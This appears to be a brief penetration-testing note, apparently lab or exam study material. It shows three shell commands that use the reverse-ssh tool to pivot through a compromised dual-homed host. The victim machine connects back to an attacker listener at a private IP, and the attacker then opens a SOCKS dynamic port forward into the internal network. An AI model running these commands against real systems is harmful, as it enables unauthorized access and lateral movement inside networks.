Using `reverse-ssh`,
1. On the attacker side, run
	```shell
	./reverse-sshx64 -l -v -p 22
	```
2. With a shell on 192.168.x.121 which is dual-homed, run
	```shell
	reverse-sshx64.exe -p 22 -b 8121 whatever@192.168.45.163
	```
3. Finally, on attacker side, set up dynamic port-forwarding with
	```shell
	ssh -v -N -D 9999 whatever@127.0.0.1 -p 8121
	```
